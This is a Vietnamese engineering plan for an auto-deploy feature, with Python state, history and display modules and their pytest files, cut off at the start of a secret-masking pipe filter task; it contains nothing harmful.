# Lát TM-3 — tự deploy, sửa plan vòng 3 (3/3)

> Thực thi từng task theo `ai-skills:executing-plans`. **Chưa đủ bằng chứng chạy thật/cả bộ**:
> test thu hồi tiến trình thật bị sandbox chặn `/bin/ps`; xem bảng kiểm chứng. Đây là phần chưa xác minh,
> không tự nó làm plan chưa đạt review tĩnh. Không dùng số xanh vòng 1 cho bản này.
> Phiên sửa plan này **không commit**, không merge/push; cuối phiên chỉ giữ file plan và báo cáo `KET-QUA-CODEX.md`.

**Goal:** Deploy đúng commit nhánh chính, bảo vệ file ba lệnh ở mọi cửa; output đi qua ống và lọc có trần trước khi ghi.

**Architecture:** `tram/deploy/` giữ trạng thái sự kiện, bộ lọc ống, runner, Git có hạn, chuỗi và điều phối.
`tram/api/tuyen_deploy.py` sở hữu tuyến Deploy dùng chung Tự động/Phê duyệt; `tram/suy/deploy.py` sở hữu khoá hiển thị.
File chung chỉ nối import/call, trừ chỗ cần truyền tập cấm bắt buộc. Không thêm bảng DB/dependency.

**Tech Stack:** Python 3.12, stdlib, FastAPI, SQLite, pytest hiện có.

**Spec:** `openspec/changes/tu-merge-tu-deploy/specs/{tu-deploy,dieu-khien-tu-dong}/spec.md`;
D89, D96–D101, **D115, D116, D123–D127, D129** trong
`docs/quyet-dinh/2026-10-18-tu-merge-tu-deploy.md` (bản main đã đọc).
Review: `.handover/review-codex-plan/REVIEW-CODEX-tm-vong1.md`, gồm phần giao nhau.
Nền: TM-1 vòng 2 `85ce7f4`, plan TM-1 `874e7c4`; tiếp theo TM-2 tại `review-tm2/docs/plans/2026-10-18-lat-tm-2-tu-merge.md`.
Không áp lại mã TM-1 vào plan này. D135/D136 xuất hiện thêm ở nguồn main, ngoài phạm vi D114–D134 được giao;
plan giữ cửa ghi chặt của TM-1, không tự thiết kế passkey.

## Global Constraints

- Kill list 3/5/7: chỉ tạm áp trong cây nháp để kiểm plan đã được Đại ca cho phép; không chạy deploy thật.
- TM-1 `file_cam` nhận token nguyên văn, callback trả `(rel_posix, "file"|"dir") | None`.
  Không sửa `tram/tu_dong/{file_cam,luu,cai_dat,khoa}.py`, `tram/bao_tin/` trong lát này.
- Cấm bắt buộc từ ba lệnh đi qua tham số `bat_buoc`; `cho_phep` chỉ miễn tập cũ. Cả code/spec/kiểm lại/thợ đều dùng.
- D115: không rõ kết quả → tạm dừng cả dự án; D116: `bat_ghi=false` chặn Deploy tay.
- D123: sẵn sàng khi tự deploy tắt tiêu trigger; bật sau đó vẫn chờ bấm. Q8: sẵn sàng vì tạm dừng giữ trigger.
- D124: tự lùi xong vẫn giữ hàng chờ bấm, không tự thử lại; D125: đỉnh nhánh chính gồm commit đẩy thẳng.
- D126: `khong_ro` không đếm hỏng; D127: lịch sử có `huy`; D129: nút Phê duyệt gọi cùng tuyến Deploy.
- Mỗi file `tram/` ≤120 dòng, dòng ≤120 ký tự; không nén nhiều trách nhiệm để lách giới hạn.
- Mọi test qua `tests/chan_host/chay.sh`; 0 dòng chặn mới. Trong sandbox phiên này dùng thêm
  `UV_CACHE_DIR=/tmp/tm3-uv UV_NO_SYNC=1` để dùng venv hiện hữu, không tải gói.
- Không giả bằng chứng: test runner thật chưa xanh thì C1/Q5 và G8 vẫn chưa đạt; test với biên giả chỉ chứng minh điều phối.

## Hợp đồng và điểm quyết định

`deploy.bat_dau` mang `commit`, `commit_truoc`, `nguon`, `ma_thao_tac`, `bao_gom: list[int]`, `yeu_cau`.
`bao_gom` là ID những `pr.da_merge` mà `merge_commit` đã kiểm là tổ tiên của **commit được chạy**;
ID chỉ dùng làm định danh tập, không dùng bất đẳng thức thời gian. Chụp trước tạo worktree.
`deploy.san_sang` mang `commit`, `so_merge`, `bao_gom`, `cho` (mã khoá lúc ghi).
V2-Q2: cùng commit/tập merge được ghi thêm đúng một lần khi cần bổ sung dấu `tu_deploy_tat`;
nhịp lặp không sinh trùng. Sự kiện tắt công tắc cũng tiêu trigger của các bản đã sẵn sàng trước nó,
kể cả tắt/bật giữa hai nhịp. Chỉ tạm dừng/tiếp tục không tiêu trigger; Deploy tay vẫn dùng hàng sẵn sàng.
`deploy.huy` mang mã yêu cầu, commit, lý do; chỉ huỷ đúng yêu cầu, không tiêu một yêu cầu khác theo ID lớn hơn.
Cửa tươi sau tạo worktree đọc lại cài đặt, estop, callback `bat_ghi`, đỉnh nhánh chính; bắt đầu rồi mới giữ snapshot D97.
Nút tay đối soát với Git và merge chưa ghi nhận ở lúc nhận (409 “Có bản mới hơn — tải lại”).
Yêu cầu đã trả 200 nhưng lỗi thời trước chạy được ghi `deploy.huy/ban_moi_hon`;
không thể trả HTTP 409 ngược vào response đã đóng, lịch sử hướng dẫn tải lại và bấm bản mới.
API và cửa tươi gọi `git ls-remote --exit-code origin refs/heads/<nhánh>` qua runner có hạn 60 giây.
Worktree lấy commit đã có trong kho kiểm; remote mới hơn thì hoãn/huỷ, chờ pha Git fetch vòng kế.
Bản remote đổi sau phép đọc cuối là cửa sổ cạnh tranh còn lại; không có khoá xuyên GitHub và deploy.

`san_sang`: null hoặc `{commit, so_merge, bead_ids, luc, commit_dang_chay}`;
`dang_deploy`: null hoặc `{trang_thai: cho|chay, commit, nguon, luc}`.
`lich_su`: `{luc, loai, bead_id, commit, chi_tiet, ai}`; `LOAI_LICH_SU` có `huy`.
TM-4 vẽ nút Deploy tại cả hai màn, gửi `expected_commit` và mã thao tác tới
`POST /api/du-an/{ten}/tu-dong/deploy`, dùng chung điều kiện khoá; không có tuyến Phê duyệt riêng.

## Bảng G — yêu cầu và test

| Cổng | Yêu cầu | Bằng chứng |
|---|---|---|
| G1 | Một hàng sẵn sàng cho commit và tập merge | `test_ba_merge_cho_deploy_mot_hang` |
| G2 | API ghi có danh tính, kênh ghi, chống trùng | `test_api_deploy.py` |
| G3 | C1: pipe → che trong RAM → log 0600; dòng 16 KiB, log 1 MiB/bước | `test_deploy_ong.py`, `test_deploy_lenh.py` (OS chưa xanh) |
| G4 | C2: ngoại lệ không miễn, token tuyệt đối được chuẩn hoá | `test_deploy_cam.py` |
| G5 | Q4–Q6: kiểm tươi, Git có hạn, bao phủ không nuốt m6 | `test_deploy_race.py`, `test_deploy_vong.py` |
| G6 | Q7: lệch bản khi nhận → 409; khi chờ chạy → huỷ | `test_co_merge_moi_chua_vao_ban_cho_thi_409`, `test_dinh_that_doi_chua_co_su_kien_409`, `test_nut_deploy_ban_cu_bi_huy_truoc_khoi_chay` |
| G7 | Q8/D123 phân biệt tạm dừng và bật mới; D124–D127 | `test_deploy_trang_thai.py`, `test_deploy_chuoi.py` |
| G8 | Chạy repo nháp trên OS: thu hồi, hạn giờ, log, các race và nút Phê duyệt | **Chưa chạy/chưa đạt**; bảng G8 cuối plan |
| G9 | Q15: ghép TM-1 → TM-2 → TM-3, file chung ≤120 dòng | mục “Ghép trên lát trước”, `test_do_dai_ma.py`, `test_vong_import.py` |

## Thứ tự áp và kiểm

Áp Task 1–9 lên TM-1 vòng 2 + TM-2 vòng 2. Test mới là nguyên văn file đầy đủ;
file cũ là unified diff so với nền nêu trên. Chạy đỏ trước mã của mỗi task, ghi lỗi thực tế;
chỉ chấp nhận xanh khi runner hoàn tất và nhật ký chặn không tăng. Không commit trong phiên sửa plan này.
Các test điều phối dùng chung fixture `Tram` trong `tests/test_deploy_vong.py`: tạo file test đó trước khi chạy `test_deploy_race.py`.
Không thay test OS bằng fixture giả; hai lớp kiểm được giữ riêng.

## Task 1: Trạng thái và lịch sử; Q6/Q8, D123–D127

**Files:** `tests/test_deploy_trang_thai.py`, `tram/deploy/__init__.py`, `tram/deploy/trang_thai.py`, `tram/deploy/hien_thi.py`

**Bằng chứng phiên này:** Đỏ đã quan sát: thiếu `chua_ghi_nhan` khi thu thập trên mã cũ. Xanh trong nhóm 60 test.

- [ ] Áp test, chạy đỏ trước mã.

### File `tests/test_deploy_trang_thai.py`

```python
"""TM-3 (tu-deploy, design D-6, D-7; D75, D96, D97 luật 2/5, D123, D124, D126, D127; Codex Q6, Q8): trạng thái tự
deploy tính lúc đọc từ sự kiện — hàm thuần, không kho, không git, không lệnh. Bao phủ ghi rõ bằng `bao_gom`."""
from tram.deploy.hien_thi import AI, LOAI_LICH_SU, dang_deploy, lich_su, san_sang
from tram.deploy.trang_thai import (SK, chua_ghi_nhan, chuoi_dang_do, commit_truoc, da_ghi_nhan, dem_hong,
                                    merge_chua_deploy, tu_merge_cho_deploy, yeu_cau_cho)

TRAM = "tram/tu-deploy"


class Dong:
    """Dựng dãy sự kiện cũ → mới, id tăng dần."""

    def __init__(self):
        self.ds: list[SK] = []

    def __call__(self, kieu: str, bead: str | None = None, tac_nhan: str = TRAM, /, **du_lieu) -> SK:
        s = SK(len(self.ds) + 1, kieu, du_lieu, f"2026-10-18T10:{len(self.ds):02d}:00Z", tac_nhan, bead)
        self.ds.append(s)
        return s


def merge(d: Dong, bead: str, mc: str, *, tu: bool) -> SK:
    if tu:
        d("tu_merge.bat_dau", bead, "tram/tu-merge", ma_thao_tac=f"tm-{bead}", commit=f"c-{bead}", pr=7, loai="code")
    return d("pr.da_merge", bead, "tram/giao-viec", commit=f"c-{bead}", merge_commit=mc, pr=7, ma_thao_tac=f"pr-{bead}")


def chuoi(d: Dong, ma: str, commit: str, ket_qua: str | None, bao=(), nguon: str = "tu_dong", dem: int = 0,
          truoc: str = "", yeu_cau: str | None = None):
    d("deploy.bat_dau", ma_thao_tac=ma, commit=commit, commit_truoc=truoc, nguon=nguon, bao_gom=[s.id for s in bao],
      **({"yeu_cau": yeu_cau} if yeu_cau else {}))
    d("deploy.lenh", ma_thao_tac=ma, buoc="deploy", ma_thoat=1, giay=12, het_gio=False, digest_log="sha256:x")
    if ket_qua:
        d("deploy.xong", ma_thao_tac=ma, ket_qua=ket_qua, dem_hong=dem)


def ss(d: Dong, commit: str, *bao: SK, cho=()):
    return d("deploy.san_sang", commit=commit, so_merge=len(bao), bao_gom=[s.id for s in bao], cho=list(cho))


def test_tu_merge_moi_la_co_tu_deploy_gop_tay_thi_khong():
    """D-6: chỉ TỰ merge mới kích tự deploy; Đại ca gộp tay (D96) chỉ thành "sẵn sàng"; PR spec (D95) không kích."""
    d = Dong()
    m6 = merge(d, "rn-6", "m6", tu=False)
    assert tu_merge_cho_deploy(d.ds) is None and merge_chua_deploy(d.ds) == [m6]
    m7 = merge(d, "rn-7", "m7", tu=True)
    assert tu_merge_cho_deploy(d.ds) == m7
    d("tu_merge.bat_dau", "f-1", "tram/tu-merge", ma_thao_tac="tm-f", commit="c-f-1", pr=8, loai="spec")
    d("pr.da_merge", "f-1", "tram/giao-viec", commit="c-f-1", merge_commit="m8", ma_thao_tac="pr-f")
    assert tu_merge_cho_deploy(d.ds) == m7


def test_san_sang_khi_tu_deploy_tat_tieu_kich_khi_tam_dung_thi_khong():
    """D123: bản đã báo "sẵn sàng" lúc tự deploy TẮT → chờ Đại ca bấm. Codex Q8: báo "sẵn sàng" vì TẠM DỪNG không
    tiêu kích — Tiếp tục thì tự deploy."""
    d = Dong()
    m7 = merge(d, "rn-7", "m7", tu=True)
    s = ss(d, "m7", m7, cho=["tam_dung_du_an"])
    assert tu_merge_cho_deploy(d.ds) == m7 and da_ghi_nhan(d.ds, "m7", [m7.id]) and not da_ghi_nhan(d.ds, "m8", [])
    ss(d, "m7", m7, cho=["tu_deploy_tat"])
    assert tu_merge_cho_deploy(d.ds) is None and san_sang(d.ds)["commit"] == "m7" and s.id < d.ds[-1].id


def test_bao_phu_ghi_ro_khong_dung_thu_tu_id():
    """Codex Q6: m6 ghi `pr.da_merge` TRƯỚC `bat_dau` của chuỗi m5 nhưng worktree chỉ chứa m5 → m5 `dat` không làm
    m6 thành "đã deploy"; kích tự deploy của m6 vẫn còn."""
    d = Dong()
    m5 = merge(d, "rn-5", "m5", tu=True)
    m6 = merge(d, "rn-6", "m6", tu=True)
    chuoi(d, "dp-5", "m5", "dat", bao=[m5])
    assert merge_chua_deploy(d.ds) == [m6] and tu_merge_cho_deploy(d.ds) == m6 and commit_truoc(d.ds) == "m5"
    assert san_sang(d.ds) is None and chua_ghi_nhan(d.ds) == [m6]       # chưa vòng nào ghi nhận m6
    ss(d, "m6", m6)
    assert san_sang(d.ds)["bead_ids"] == ["rn-6"] and chua_ghi_nhan(d.ds) == []


def test_ba_merge_cho_deploy_mot_hang():
    """Scenario "Ba lần merge chờ deploy": một hàng cho commit mới nhất, "gồm 3 việc đã merge"."""
    d = Dong()
    ms = [merge(d, f"rn-{i}", f"m{i}", tu=True) for i in (7, 8, 9)]
    assert san_sang(d.ds) is None                                   # vòng deploy chưa ghi nhận commit nào
    ss(d, "m9", *ms)
    s = san_sang(d.ds)
    assert s == {"commit": "m9", "so_merge": 3, "bead_ids": ["rn-7", "rn-8", "rn-9"], "luc": s["luc"],
                 "commit_dang_chay": None}


def test_dang_deploy_an_hang_va_yeu_cau_cho():
    """Scenario "Đại ca bấm Deploy": hàng "sẵn sàng" chuyển "đang deploy"; yêu cầu chờ tới khi một chuỗi nhận nó."""
    d = Dong()
    m5 = merge(d, "rn-7", "m5", tu=False)
    ss(d, "m5", m5)
    yc = d("deploy.yeu_cau", None, "dai-ca/dashboard", ma_thao_tac="ma-dp-1", commit="m5", nguon="dai_ca")
    assert yeu_cau_cho(d.ds) == yc and san_sang(d.ds) is None
    assert dang_deploy(d.ds) == {"trang_thai": "cho", "commit": "m5", "nguon": "dai_ca", "luc": yc.luc}
    chuoi(d, "dp-0", "m5", "khong_ro", bao=[m5])                    # chuỗi KHÁC không tiêu yêu cầu (không theo id)
    assert yeu_cau_cho(d.ds) == yc
    chuoi(d, "dp-1", "m5", None, bao=[m5], nguon="dai_ca", yeu_cau="ma-dp-1")
    assert yeu_cau_cho(d.ds) is None and [s.du_lieu["ma_thao_tac"] for s in chuoi_dang_do(d.ds)] == ["dp-1"]
    assert dang_deploy(d.ds)["trang_thai"] == "chay"
    d("deploy.xong", ma_thao_tac="dp-1", ket_qua="dat", dem_hong=0)
    assert dang_deploy(d.ds) is None and san_sang(d.ds) is None and commit_truoc(d.ds) == "m5"
    assert merge_chua_deploy(d.ds) == []


def test_huy_tieu_thu_yeu_cau():
    d = Dong()
    d("deploy.yeu_cau", None, "dai-ca/dashboard", ma_thao_tac="ma-dp-2", commit="m5", nguon="dai_ca")
    d("deploy.huy", ma_thao_tac="ma-dp-2", commit="m5", ly_do="estop")
    assert yeu_cau_cho(d.ds) is None and dang_deploy(d.ds) is None


def test_hong_xong_van_san_sang_cho_dai_ca_bam_lai():
    """D124: sau lần hỏng đã lùi, bản đó vẫn ở hàng "sẵn sàng" để Đại ca bấm lại — trạm không tự thử lại."""
    d = Dong()
    chuoi(d, "dp-0", "m4", "dat")
    m = merge(d, "rn-13", "c0d9", tu=True)
    chuoi(d, "dp-1", "c0d9", "da_lui", bao=[m], dem=1)
    assert tu_merge_cho_deploy(d.ds) is None                        # đã vào một chuỗi
    s = san_sang(d.ds)
    assert (s["commit"], s["so_merge"], s["commit_dang_chay"], commit_truoc(d.ds)) == ("c0d9", 1, "m4", "m4")


def test_dem_hong_lien_tiep():
    """D75: đếm `da_lui`/`lui_hong` từ lần `dat` hoặc lần bật lại tự deploy; D126: `khong_ro` không tính."""
    d = Dong()
    chuoi(d, "a", "m1", "da_lui")
    chuoi(d, "b", "m1", "khong_ro")
    chuoi(d, "c", "m1", "da_lui")
    assert dem_hong(d.ds) == 2
    chuoi(d, "e", "m2", "dat")                                      # Scenario "Thành công xen giữa"
    assert dem_hong(d.ds) == 0
    chuoi(d, "f", "m3", "da_lui")
    chuoi(d, "g", "m3", "lui_hong")
    assert dem_hong(d.ds) == 2
    d("tu_dong.cai_dat", None, "dai-ca/dashboard", cai_dat={"tu_deploy": False}, doi=["lenh_lui"])
    assert dem_hong(d.ds) == 2
    d("tu_dong.cai_dat", None, "dai-ca/dashboard", cai_dat={"tu_deploy": True}, doi=["tu_deploy"])
    assert dem_hong(d.ds) == 0                                      # Đại ca bật lại → về 0


def test_lich_su_dang_hop_dong_tm4_khong_chep_lenh():
    """Dạng khoá TM-4: `{luc, loai, bead_id, commit, chi_tiet, ai}`; `chi_tiet` chỉ mã thoát/giây/PR/commit ngắn;
    D127: nút Deploy bị huỷ thành dòng `huy` kèm lý do bằng lời."""
    d = Dong()
    m11 = merge(d, "rn-11", "9be2", tu=False)                       # gộp tay: không thành dòng riêng
    m12 = merge(d, "rn-12", "a41c", tu=True)
    ss(d, "a41c", m11, m12)
    chuoi(d, "dp-9", "a41c", "da_lui", bao=[m11, m12], dem=1, nguon="dai_ca", truoc="5d3e8b2aa", yeu_cau="ma-0")
    d("deploy.lenh", ma_thao_tac="dp-9", buoc="lui", ma_thoat=None, giay=900, het_gio=True, digest_log="sha256:y")
    d("tu_dong.cai_dat", cai_dat={"tu_deploy": False}, doi=["tu_deploy"], ly_do="hong-3-lan")
    d("tu_dong.tam_dung", ly_do="khong-ro")
    d("tu_dong.tam_dung", None, "dai-ca/dashboard", ma_thao_tac="x")          # Đại ca bấm: đã có ở lịch sử đổi
    d("deploy.huy", ma_thao_tac="ma-1", commit="a41c", ly_do="estop")
    d("deploy.huy", ma_thao_tac="ma-2", commit="a41c", ly_do="ban_moi_hon")
    ls = lich_su(d.ds)
    assert [(x["loai"], x["ai"]) for x in ls] == [("huy", "dai_ca_bam"), ("huy", "dai_ca_bam"), ("tam_dung", "tram"),
                                                  ("tu_tat", "tram"), ("deploy_lui", "dai_ca_bam"),
                                                  ("san_sang", "tram"), ("tu_merge", "tram")]
    assert {x["loai"] for x in ls} <= set(LOAI_LICH_SU) and {x["ai"] for x in ls} <= set(AI)
    assert all(set(x) == {"luc", "loai", "bead_id", "commit", "chi_tiet", "ai"} for x in ls)
    assert (ls[0]["chi_tiet"], ls[1]["chi_tiet"], ls[1]["commit"]) == (
        "Có bản mới hơn — bấm Deploy lại trên bản mới", "Estop đang bật", "a41c")
    assert ls[2]["chi_tiet"].endswith("deploy không rõ kết quả — cần Đại ca kiểm")
    assert ls[3]["chi_tiet"] == "hỏng 3 lần liên tiếp — chờ Đại ca bật lại"
    assert ls[4]["chi_tiet"] == "deploy: mã thoát 1 · 12 giây → lùi: quá hạn · 900 giây (bản trước 5d3e8b2)"
    assert (ls[4]["commit"], ls[5]["chi_tiet"]) == ("a41c", "gồm 2 việc đã merge")
    assert (ls[6]["bead_id"], ls[6]["commit"], ls[6]["chi_tiet"]) == ("rn-12", "a41c", "PR #7")
    assert len(lich_su(d.ds, gioi_han=2)) == 2
```

### File `tram/deploy/__init__.py`

```python
```

### File `tram/deploy/trang_thai.py`

```python
"""Trạng thái deploy: chỉ tiêu thụ merge đã ghi trong tập bao phủ của commit thực chạy."""
import json
import sqlite3
from collections.abc import Callable
from dataclasses import dataclass

TAC_NHAN = "tram/tu-deploy"
LOAI = ("pr.da_merge", "tu_merge.bat_dau", "deploy.yeu_cau", "deploy.huy", "deploy.san_sang", "deploy.bat_dau",
        "deploy.lenh", "deploy.xong", "tu_dong.cai_dat", "tu_dong.tam_dung")
HONG = ("da_lui", "lui_hong")


@dataclass(frozen=True)
class SK:
    id: int
    loai: str
    du_lieu: dict
    luc: str
    tac_nhan: str
    bead_id: str | None


def doc_su_kien(db: sqlite3.Connection, du_an: str) -> list[SK]:
    return [SK(i, l, json.loads(d), luc, tn, b) for i, l, d, luc, tn, b in db.execute(
        f"SELECT id, loai, du_lieu, luc, tac_nhan, bead_id FROM su_kien WHERE du_an = ? AND loai IN"
        f" ({','.join('?' * len(LOAI))}) ORDER BY id", (du_an, *LOAI))]


def cuoi(ds: list[SK], loai: str, dk: Callable[[SK], bool] = lambda s: True) -> SK | None:
    return next((s for s in reversed(ds) if s.loai == loai and dk(s)), None)


def _id(s: SK | None) -> int:
    return s.id if s else 0


def ma(s: SK) -> str | None:
    return s.du_lieu.get("ma_thao_tac")


def chuoi_dang_do(ds: list[SK]) -> list[SK]:
    xong = {ma(s) for s in ds if s.loai == "deploy.xong"}
    return [s for s in ds if s.loai == "deploy.bat_dau" and ma(s) not in xong]


def bat_dau_cua(ds: list[SK], x: SK) -> SK | None:
    return cuoi(ds, "deploy.bat_dau", lambda s: ma(s) == ma(x))


def bat_dau_dat(ds: list[SK]) -> SK | None:
    """`deploy.bat_dau` của chuỗi `dat` gần nhất — bản khách đang dùng."""
    x = cuoi(ds, "deploy.xong", lambda s: s.du_lieu.get("ket_qua") == "dat")
    return None if x is None else bat_dau_cua(ds, x)


def dem_hong(ds: list[SK]) -> int:
    def bat_lai(s: SK) -> bool:
        return "tu_deploy" in s.du_lieu.get("doi", ()) and s.du_lieu.get("cai_dat", {}).get("tu_deploy") is True
    moc = max(_id(cuoi(ds, "deploy.xong", lambda s: s.du_lieu.get("ket_qua") == "dat")),
              _id(cuoi(ds, "tu_dong.cai_dat", bat_lai)))
    return sum(s.id > moc and s.loai == "deploy.xong" and s.du_lieu.get("ket_qua") in HONG for s in ds)


def yeu_cau_cho(ds: list[SK]) -> SK | None:
    da = {s.du_lieu.get("yeu_cau") for s in ds if s.loai == "deploy.bat_dau"}
    da |= {ma(s) for s in ds if s.loai == "deploy.huy"}
    return cuoi(ds, "deploy.yeu_cau", lambda s: ma(s) not in da)


def la_tu_merge(ds: list[SK], m: SK) -> bool:
    return any(s.loai == "tu_merge.bat_dau" and s.bead_id == m.bead_id and s.du_lieu.get("loai", "code") == "code"
               and s.du_lieu.get("commit") == m.du_lieu.get("commit") for s in ds)


def bao_gom(ds: list[SK], loai: str, dk=lambda s: True) -> set[int]:
    return {i for s in ds if s.loai == loai and dk(s) for i in s.du_lieu.get("bao_gom", [])}


def tu_merge_cho_deploy(ds: list[SK], *, ma_nguon: str | None = None) -> SK | None:
    # D123: cả khi tắt/bật giữa hai nhịp, bản đã sẵn sàng trước lần tắt vẫn chờ Đại ca.
    tat = _id(cuoi(ds, "tu_dong.cai_dat", lambda s: "tu_deploy" in s.du_lieu.get("doi", [])
                  and s.du_lieu.get("cai_dat", {}).get("tu_deploy") is False))
    da = bao_gom(ds, "deploy.bat_dau") | bao_gom(ds, "deploy.san_sang", lambda s: "tu_deploy_tat" in
                                               s.du_lieu.get("cho", []))
    da |= bao_gom(ds, "deploy.san_sang", lambda s: s.id < tat)
    return cuoi(ds, "pr.da_merge", lambda s: s.id not in da and la_tu_merge(ds, s)
                and (ma_nguon is None or ma_nguon == f"sk-{s.id}"))


def merge_chua_deploy(ds: list[SK]) -> list[SK]:
    dat = {ma(s) for s in ds if s.loai == "deploy.xong" and s.du_lieu.get("ket_qua") == "dat"}
    da = bao_gom(ds, "deploy.bat_dau", lambda s: ma(s) in dat)
    return [s for s in ds if s.loai == "pr.da_merge" and s.id not in da]


def moc_ban(ds: list[SK]) -> list[SK]:
    return [s for s in ds if s.loai in ("deploy.san_sang", "deploy.bat_dau")]


def chua_ghi_nhan(ds: list[SK]) -> list[SK]:
    da = bao_gom(ds, "deploy.san_sang") | bao_gom(ds, "deploy.bat_dau")
    return [s for s in merge_chua_deploy(ds) if s.id not in da]


def da_ghi_nhan(ds: list[SK], commit: str, bao: list[int] | None = None, *, cho=()) -> bool:
    # Chỉ thêm bản ghi khi cần lưu dấu tắt; không ghi lặp theo các lý do tạm dừng khác.
    return any(s.du_lieu.get("commit") == commit and
               ("tu_deploy_tat" not in cho or "tu_deploy_tat" in s.du_lieu.get("cho", [])) and
               (bao is None or set(s.du_lieu.get("bao_gom", [])) == set(bao)) for s in moc_ban(ds))


def commit_truoc(ds: list[SK]) -> str:
    bd = bat_dau_dat(ds)
    return bd.du_lieu["commit"] if bd else ""
```

### File `tram/deploy/hien_thi.py`

```python
"""Phần hiển thị của tự deploy cho trang Tự động và trang Phê duyệt (design D-5, D101; dạng khoá theo hợp đồng của
plan TM-4) — tính lúc đọc từ sự kiện: hàng "sẵn sàng deploy", "đang deploy", lịch sử (mới → cũ). `chi_tiet` do máy
chủ dựng, CHỈ mã thoát, số giây, quá hạn, số PR, commit ngắn — KHÔNG lệnh, đầu ra lệnh (spec "Không lọt bí mật")."""
from tram.deploy.trang_thai import (SK, bat_dau_cua, chuoi_dang_do, commit_truoc, la_tu_merge, ma, merge_chua_deploy,
                                    moc_ban, yeu_cau_cho)

LOAI_LICH_SU = ("tu_merge", "san_sang", "deploy_dat", "deploy_lui", "lui_hong", "khong_ro", "tu_tat", "tam_dung", "huy")
AI = ("dai_ca", "dai_ca_bam", "tu_deploy", "tram")
LOAI_XONG = {"dat": "deploy_dat", "da_lui": "deploy_lui", "lui_hong": "lui_hong", "khong_ro": "khong_ro"}
TEN_BUOC = {"deploy": "deploy", "kiem_song": "kiểm còn sống", "lui": "lùi",
            "kiem_song_sau_lui": "kiểm còn sống sau lùi"}
CAU_TRAM = {("tu_tat", "hong-3-lan"): "hỏng 3 lần liên tiếp — chờ Đại ca bật lại",
            ("tu_tat", "lui-hong"): "lùi hỏng — trạm tắt tự deploy",
            ("tam_dung", "lui-hong"): "trạm tạm dừng dự án sau khi lùi hỏng",
            ("tam_dung", "khong-ro"): "trạm tạm dừng dự án: deploy không rõ kết quả — cần Đại ca kiểm"}


def dang_deploy(ds: list[SK]) -> dict | None:
    if dd := chuoi_dang_do(ds):
        d = dd[-1].du_lieu
        return {"trang_thai": "chay", "commit": d.get("commit"), "nguon": d.get("nguon"), "luc": dd[-1].luc}
    if yc := yeu_cau_cho(ds):
        return {"trang_thai": "cho", "commit": yc.du_lieu.get("commit"), "nguon": "dai_ca", "luc": yc.luc}
    return None


def san_sang(ds: list[SK]) -> dict | None:
    """Hàng "sẵn sàng deploy" (D96, D97 luật 5): MỘT hàng cho commit mới nhất trạm đã ghi nhận sau lần `dat`, gồm mọi
    merge chưa lên trước nó. None khi không có gì chờ hay đang deploy. Người gọi xét thêm "đủ 3 lệnh"."""
    moc = moc_ban(ds)
    gom = [s for s in merge_chua_deploy(ds) if moc and s.id in moc[-1].du_lieu.get("bao_gom", [])]
    if not gom or dang_deploy(ds) is not None:
        return None
    return {"commit": moc[-1].du_lieu["commit"], "so_merge": len(gom), "bead_ids": [s.bead_id for s in gom],
            "luc": moc[-1].luc, "commit_dang_chay": commit_truoc(ds) or None}


def _buoc(x: SK) -> str:
    d = x.du_lieu
    ket = "quá hạn" if d.get("het_gio") else f"mã thoát {d.get('ma_thoat')}"
    return f"{TEN_BUOC.get(d.get('buoc'), d.get('buoc'))}: {ket} · {d.get('giay')} giây"


def _dong(ds: list[SK], s: SK) -> dict | None:
    d, tram = s.du_lieu, s.tac_nhan.startswith("tram/")
    if s.loai == "pr.da_merge" and la_tu_merge(ds, s):           # gộp tay: đã nằm trong "gồm N việc"
        return {"loai": "tu_merge", "bead_id": s.bead_id, "commit": d.get("merge_commit"),
                "chi_tiet": f"PR #{d['pr']}" if "pr" in d else "", "ai": "tram"}
    if s.loai == "deploy.huy":
        from tram.tu_dong.khoa import NHAN_LY_DO
        nhan = {**NHAN_LY_DO, "ban_moi_hon": "Có bản mới hơn — bấm Deploy lại trên bản mới"}
        return {"loai": "huy", "bead_id": None, "commit": d.get("commit"), "ai": "dai_ca_bam",
                "chi_tiet": nhan.get(d.get("ly_do"), "Không thể deploy — tải lại")}
    if s.loai == "deploy.san_sang":
        return {"loai": "san_sang", "bead_id": None, "commit": d.get("commit"),
                "chi_tiet": f"gồm {d.get('so_merge')} việc đã merge", "ai": "tram"}
    if s.loai == "deploy.xong" and d.get("ket_qua") in LOAI_XONG:
        bd = bat_dau_cua(ds, s)
        bd = bd.du_lieu if bd else {}
        buoc = " → ".join(_buoc(x) for x in ds if x.loai == "deploy.lenh" and ma(x) == ma(s))
        if d["ket_qua"] in ("da_lui", "lui_hong") and bd.get("commit_truoc"):
            buoc += f" (bản trước {bd['commit_truoc'][:7]})"
        return {"loai": LOAI_XONG[d["ket_qua"]], "bead_id": None, "commit": bd.get("commit"), "chi_tiet": buoc,
                "ai": "dai_ca_bam" if bd.get("nguon") == "dai_ca" else "tu_deploy"}
    loai = {"tu_dong.cai_dat": "tu_tat", "tu_dong.tam_dung": "tam_dung"}.get(s.loai)
    if loai and tram and (loai, d.get("ly_do")) in CAU_TRAM:
        return {"loai": loai, "bead_id": None, "commit": None, "chi_tiet": CAU_TRAM[(loai, d["ly_do"])], "ai": "tram"}
    return None


def lich_su(ds: list[SK], gioi_han: int = 20) -> list[dict]:
    """`loai` ∈ `LOAI_LICH_SU`, `ai` ∈ `AI`. D127: nút Deploy bị huỷ có loại `huy`."""
    ra = ({"luc": s.luc, **x} for s in reversed(ds) if (x := _dong(ds, s)) is not None)
    return [x for _, x in zip(range(gioi_han), ra)]
```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

```bash
tests/chan_host/chay.sh -q tests/test_deploy_trang_thai.py
```

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

## Task 2: Ống và runner; C1

**Files:** `tests/test_deploy_ong.py`, `tests/test_deploy_lenh.py`, `tram/deploy/ong.py`, `tram/deploy/lenh.py`

**Bằng chứng phiên này:** Đỏ thực: bí mật nằm trong `.tam`, lỗi assertion ở test đang chạy/ngắt. Sau sửa: nhóm runner 7 passed, 3 failed, 1 deselected; thu hồi OS chưa xác nhận do sandbox chặn ps. Không đánh dấu đóng C1.

- [ ] Áp test, chạy đỏ trước mã.

### File `tests/test_deploy_ong.py`

```python
"""C1: bộ lọc có trần trước mọi ghi đĩa; test thuần, không thay thế kiểm vòng đời OS."""
from tram.deploy.ong import DONG_CHE, Loc, TRAN_DONG, TRAN_LOG


def test_token_tach_goi_khong_ghi_truoc_khi_che():
    ghi = []
    loc = Loc(ghi.append)
    token = b"ghp_" + b"A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
    loc.nhan(token[:20])
    assert ghi == []
